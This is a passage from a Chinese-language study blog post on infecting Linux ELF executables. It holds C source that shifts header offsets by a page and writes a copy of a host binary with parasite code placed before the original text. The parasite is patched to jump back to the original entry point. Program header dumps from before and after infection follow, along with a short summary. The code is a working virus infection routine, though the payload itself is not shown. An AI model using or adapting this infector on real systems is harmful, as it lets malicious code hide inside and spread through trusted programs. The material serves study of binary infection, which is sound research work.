        s_hdr = (Elf64_Shdr *)(mem + o_shoff);
        printf("section header offset is: %d\n",o_shoff);
        printf("section number is: %d\n",e_hdr->e_shnum);
        for(i=0; ie_shnum; i++)
        {
            s_hdr[i].sh_offset += PAGE_SIZE;
            printf("section header address: %d-->%d\n",i, s_hdr[i].sh_offset);
        }
        /*
         * 5. 将文件头中的程序头偏移 ehdr->e_phoff增加最小虚拟映射地址的整数倍（足够存放寄生代码的长度）
         */
        e_hdr->e_phoff += PAGE_SIZE;
        /*
         * 6. 插入寄生代码
         *
         */
        mirror_binary_with_parasite(parasite_size, mem, parasite);
        munmap(mem, st.st_size);
        close(fd);
        return 0;
    }
    void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, char *parasite)
    {
        int ofd;
        int c;
        printf("Mirroring host binary with parasite %d bytes\n",psize);
        if((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
        {
            perror("tmp binary: open");
            exit(-1);
        }
        //写入文件头
        if ((c = write(ofd, mem, ehdr_size)) != ehdr_size)
        {
            printf("failed writing ehdr\n");
            exit(-1);
        }
        printf("Patching parasite to jmp to %lx\n", entry_point);
        //写入寄生代码
        *(unsigned int *)&parasite[return_entry_start] = entry_point;
        if ((c = write(ofd, parasite, psize)) != psize)
        {
            perror("writing parasite failed");
            exit(-1); 
        }
        //填充部分
        if ((c = lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET)) != ehdr_size + PAGE_SIZE)
        {
            printf("lseek only wrote %d bytes\n", c);
            exit(-1);
        }
        mem += ehdr_size;
        if ((c = write(ofd, mem, st.st_size-ehdr_size)) != st.st_size-ehdr_size)
        {
            printf("Failed writing binary, wrote %d bytes\n", c);
            exit(-1);
        }
        close(ofd);
    }
### 寄生前后程序对比
    寄生前############################################################################
    Elf 文件类型为 EXEC (可执行文件)
    入口点 0x400500
    共有 9 个程序头，开始于偏移量64
    程序头：
      Type           Offset             VirtAddr           PhysAddr
                     FileSiz            MemSiz              Flags  Align
      PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                     0x00000000000001f8 0x00000000000001f8  R E    8
      INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238
                     0x000000000000001c 0x000000000000001c  R      1
          [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
      LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                     0x0000000000000824 0x0000000000000824  R E    200000
      LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
                     0x0000000000000234 0x0000000000000238  RW     200000
      DYNAMIC        0x0000000000000e28 0x0000000000600e28 0x0000000000600e28
                     0x00000000000001d0 0x00000000000001d0  RW     8
      NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254
                     0x0000000000000044 0x0000000000000044  R      4
      GNU_EH_FRAME   0x00000000000006f8 0x00000000004006f8 0x00000000004006f8
                     0x0000000000000034 0x0000000000000034  R      4
      GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                     0x0000000000000000 0x0000000000000000  RW     10
      GNU_RELRO      0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
                     0x00000000000001f0 0x00000000000001f0  R      1
    ###############################################################################
    寄生后############################################################################
    入口点 0x3ff040
    共有 9 个程序头，开始于偏移量4160
    程序头：
      Type           Offset             VirtAddr           PhysAddr
                     FileSiz            MemSiz              Flags  Align
      PHDR           0x0000000000001040 0x0000000000400040 0x0000000000400040
                     0x00000000000001f8 0x00000000000001f8  R E    8
      INTERP         0x0000000000001238 0x0000000000400238 0x0000000000400238
                     0x000000000000001c 0x000000000000001c  R      1
          [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
      LOAD           0x0000000000000000 0x00000000003ff000 0x00000000003ff000
                     0x0000000000001824 0x0000000000001824  R E    200000
      LOAD           0x0000000000001e10 0x0000000000600e10 0x0000000000600e10
                     0x0000000000000234 0x0000000000000238  RW     200000
      DYNAMIC        0x0000000000001e28 0x0000000000600e28 0x0000000000600e28
                     0x00000000000001d0 0x00000000000001d0  RW     8
      NOTE           0x0000000000001254 0x0000000000400254 0x0000000000400254
                     0x0000000000000044 0x0000000000000044  R      4
      GNU_EH_FRAME   0x00000000000016f8 0x00000000004006f8 0x00000000004006f8
                     0x0000000000000034 0x0000000000000034  R      4
      GNU_STACK      0x0000000000001000 0x0000000000000000 0x0000000000000000
                     0x0000000000000000 0x0000000000000000  RW     10
      GNU_RELRO      0x0000000000001e10 0x0000000000600e10 0x0000000000600e10
                     0x00000000000001f0 0x00000000000001f0  R      1
  1. 入口点位置提前了
  2. text段的虚拟地址提前了0x1000字节，从0x0000000000400000变成了0x00000000003ff000，主要就是填充寄生代码、文件头和多余的填充区域
        Type           Offset             VirtAddr           PhysAddr
                     FileSiz            MemSiz              Flags  Align
    寄生前########################################################################
    LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                     0x0000000000000824 0x0000000000000824  R E    200000
    寄生后############################################################################
    LOAD           0x0000000000000000 0x00000000003ff000 0x00000000003ff000
                     0x0000000000001824 0x0000000000001824  R E    200000
# 总结
总体学习过程也还可以，难度不是很大，当时第一眼看linux二进制分析的时候也是云里雾里，之后在网上找一些这个技术的相关博文后面接着看了ELF文件的一些规范和作者的注入代码基本就懂了
整个感染技术还是比较简单的，可以边看源码边去看一下ELF的一些规范。
# 参考
> [1]
> [ELF文件的加载过程(load_elf_binary函数详解)--Linux进程的管理与调度（十三）](https://blog.csdn.net/gatieme/article/details/51628257)